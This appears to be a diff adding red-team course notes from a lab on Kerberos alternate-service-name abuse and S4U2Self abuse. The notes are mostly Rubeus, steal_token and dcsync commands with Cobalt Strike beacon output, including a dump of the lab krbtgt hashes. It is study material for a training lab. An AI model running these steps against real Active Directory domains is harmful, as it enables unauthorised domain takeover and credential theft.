@@ -569,3 +569,240 @@ beacon> ls \\dc-2\c$
 
 ## Alternate Service Name
 
+The `CIFS` service can be leveraged for listing and transferring files, _<mark style="color:yellow;">**but what if port**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`445`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**was unavailable**</mark>_ (due to `SMB` or something) _<mark style="color:yellow;">**or we wanted an option for lateral movement**</mark>_?
+
+In the _**Kerberos authentication protocol**_, <mark style="color:green;">a service validates an inbound ticket by ensuring that it's encrypted with that service's symmetric key</mark>.
+
+<mark style="color:green;">The key is derived from the password hash of the principal running the service</mark>. _**Most**_ services run in the <mark style="color:yellow;">`SYSTEM`</mark> context of a computer account, (e.g. <mark style="color:yellow;">`SQL-2$`</mark>). Therefore, all service tickets, whether they're for <mark style="color:yellow;">`CIFS`</mark>, <mark style="color:yellow;">`TIME`</mark>, or <mark style="color:yellow;">`HOST`</mark>, etc., will be encrypted with the same key. The SPN does not factor into ticket validation.
+
+**KEY PIECE TO UNDERSTANDING:&#x20;**_**As a result, the&#x20;**<mark style="color:yellow;">**SPN information**</mark>**&#x20;in the&#x20;**<mark style="color:yellow;">**ticket**</mark>**&#x20;(e.g.&#x20;**<mark style="color:yellow;">**the**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`sname`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**field**</mark>**)&#x20;**<mark style="color:green;">**is not encrypted and can be changed arbitrarily**</mark>**.**_&#x20;
+
+<mark style="color:yellow;">That means that we can request a service ticket for a service</mark>, such as <mark style="color:yellow;">`CIFS`</mark>, <mark style="color:green;">but then modify the SPN to something different</mark>, such as <mark style="color:yellow;">`LDAP`</mark>, <mark style="color:green;">and the target service will accept it happily</mark>.
+
+{% hint style="info" %}
+:bulb:
+
+_**This was originally discovered by**_ [_**Alberto Solino**_](https://twitter.com/agsolino) _**and confirmed as "by design" by Microsoft.**_
+{% endhint %}
+
+### Exploiting Alternate Services via `Rubeus /altservice`
+
+**We can&#x20;**<mark style="color:red;">**abuse**</mark>**&#x20;this using the&#x20;**<mark style="color:yellow;">**`/altservice`**</mark>**&#x20;flag in `Rubeus`. In this example, we're going to be using the&#x20;**<mark style="color:green;">**same**</mark>**&#x20;**<mark style="color:yellow;">**TGT**</mark>**&#x20;**<mark style="color:green;">**for**</mark>**&#x20;**<mark style="color:yellow;">**`SQL-2`**</mark>**&#x20;**<mark style="color:green;">**to request a**</mark>**&#x20;**<mark style="color:yellow;">**TGS**</mark>**&#x20;**<mark style="color:green;">**for**</mark>**&#x20;**<mark style="color:yellow;">**LDAP**</mark>**&#x20;**<mark style="color:green;">**instead of**</mark>**&#x20;**<mark style="color:yellow;">**`CIFS`**</mark>**:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2self request to 10.10.122.10:88
+[+] S4U2self success!
+[*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFnD[...]FMLTIk
+
+[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
+[*]   Final ticket will be for the alternate service 'ldap'
+[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'ldap'
+[*] base64(ticket.kirbi) for SPN 'ldap/dc-2.dev.cyberbotic.io':
+
+      doIGaD[...]ljLmlv
+			
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
+	
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2580
+[+] Ticket successfully imported!
+[+] LUID            : 0x4b328e
+			
+beacon> steal_token 2580
+```
+
+**Against the Domain Controller, the LDAP service allows us to perform a `DCSYNC`:**
+
+```
+beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+
+[DC] 'dev.cyberbotic.io' will be the domain
+[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
+[DC] 'DEV\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 8/15/2022 4:01:04 PM
+Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
+    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
+    lm  - 0: 207d5e08551c51892309c0cf652c353b
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
+      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
+      des_cbc_md5       (4096) : 629189372a372fda
+```
+
+Wow :drooling\_face:, what a sweet attack vector this is!!
+
+## `S4U2Self` Abuse
+
+### What is `S4U2Self`?
+
+{% hint style="info" %}
+:bulb:
+
+**S4U -> Service for User.**
+{% endhint %}
+
+This is an "extension" that <mark style="color:green;">allows a service to obtain a service ticket to itself on behalf of a user</mark>.
+
+As we saw in the previous two examples of [#constrained-delegation](kerberos.md#constrained-delegation "mention"), **there are two different S4U (Service for User) extensions:**
+
+1. <mark style="color:yellow;">**`S4U2Self`**</mark> (Service for User to Self): Allows a service to obtain a TGS _<mark style="color:green;">**to itself on behalf of a user**</mark>_.
+2. <mark style="color:yellow;">**`S4U2Proxy`**</mark> (Service for User to Proxy): Allows the service to obtain a TGS _<mark style="color:green;">**on behalf of a user to a second service**</mark>_ (likely using the Kerberos Proxy).
+
+### Thinking back to Constrained Delegation...
+
+When we abused Constrained Delegation, we used the following `Rubeus` syntax:
+
+```
+s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$
+```
+
+**From the output, we could see that `Rubeus` will do the following:**
+
+1. First builds an <mark style="color:yellow;">`S4U2Self`</mark> request
+2. Obtains a TGS for <mark style="color:yellow;">`nlamb`</mark> to <mark style="color:yellow;">`sql-2/dev.cyberbotic.io`</mark>
+3. Lastly, builds an <mark style="color:yellow;">`S4U2Proxy`</mark> request to obtain a TGS for <mark style="color:yellow;">`nlamb`</mark> to <mark style="color:yellow;">`cifs/dc-2.dev.cyberbotic.io`</mark>
+
+This is working by design because <mark style="color:yellow;">`SQL-2`</mark> is specifically build for trust with delegation to that service.
+
+### Another way to abuse `S4U2Self`?
+
+However, there's another particularly useful way, published by [Elad Shamir](https://twitter.com/elad_shamir), to abuse the <mark style="color:yellow;">`S4U2Self`</mark> extension - <mark style="color:yellow;">and that is to gain access to a computer if we have its TGT</mark>.
+
+In the [#unconstrained-delegation](kerberos.md#unconstrained-delegation "mention") section, we obtained a TGT for the Domain Controller. <mark style="color:red;">If you tried to pass that ticket into a logon session and use it to access the</mark> <mark style="color:red;"></mark><mark style="color:red;">`C$`</mark> <mark style="color:red;"></mark><mark style="color:red;">share (like we would with a user TGT), it would fail</mark>.
+
+**We can see that attempt below:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP
+
+[*] Using DEV\DC-2$:FakePass
+
+[*] Showing process : False
+[*] Username        : DC-2$
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2832
+[+] Ticket successfully imported!
+[+] LUID            : 0x4d977f
+
+beacon> steal_token 2832
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
+```
+
+**This is because machines do not get remote local admin access to themselves.**
+
+#### Rather, what we can do is...
+
+We can <mark style="color:red;">abuse</mark> <mark style="color:yellow;">`S4U2Self`</mark> <mark style="color:green;">to obtain a usable TGS as a user we know is a local admin</mark> (e.g. a Domain Admin).
+
+<mark style="color:yellow;">**`Rubeus`**</mark>**&#x20;has a&#x20;**<mark style="color:yellow;">**`/self`**</mark>**&#x20;flag for this purpose:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DC-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2self request to 10.10.122.10:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'cifs/dc-2.dev.cyberbotic.io'
+[*] Got a TGS for 'nlamb' to 'cifs@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+doIFyD[...]MuaW8=
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
+
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2664
+[+] Ticket successfully imported!
+[+] LUID            : 0x4ff935
+
+beacon> steal_token 2664
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 15:44:08   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+          dir     08/18/2021 23:34:55   Documents and Settings
+          dir     08/19/2021 06:24:49   EFI
+          dir     08/15/2022 16:09:55   inetpub
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     08/24/2022 10:51:51   Program Files
+          dir     08/10/2022 04:06:16   Program Files (x86)
+          dir     09/05/2022 17:17:48   ProgramData
+          dir     08/15/2022 15:23:23   Recovery
+          dir     08/16/2022 12:37:38   Shares
+          dir     09/05/2022 12:03:43   System Volume Information
+          dir     08/15/2022 15:24:39   Users
+          dir     09/06/2022 15:21:25   Windows
+ 427kb    fil     08/10/2022 05:00:07   bootmgr
+ 1b       fil     05/08/2021 08:14:33   BOOTNXT
+ 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
+ 12kb     fil     09/05/2022 07:25:58   DumpStack.log
+ 12kb     fil     09/06/2022 09:04:41   DumpStack.log.tmp
+ 384mb    fil     09/06/2022 09:04:41   pagefile.sys
+```
+
+1. Abuse using <mark style="color:yellow;">`Rubeus`</mark>' <mark style="color:yellow;">`s4u`</mark> module to impersonate a local admin account (in this case is <mark style="color:yellow;">`nlamb`</mark>) to obtain a usable TGS.
+2. Use that newly obtained TGS from the local admin account to use `Rubeus`' <mark style="color:yellow;">`createnetonly`</mark> module to create a <mark style="color:yellow;">`cmd.exe`</mark> process (A.K.A. a _**new logon session**_) to grant us a shell with Beacon.
+3. Steal that newly spawned <mark style="color:yellow;">`cmd.exe`</mark> PID to perform a token theft attack via <mark style="color:yellow;">`steal_token`</mark> along with PID.
+4. Lastly list the contents of `C$` and you'll be able to see its contents.
+
+{% hint style="info" %}
+Use <mark style="color:yellow;">`run klist`</mark> to view cached tickets.
+{% endhint %}
+
+## Resource-Based Constrained Delegation
+
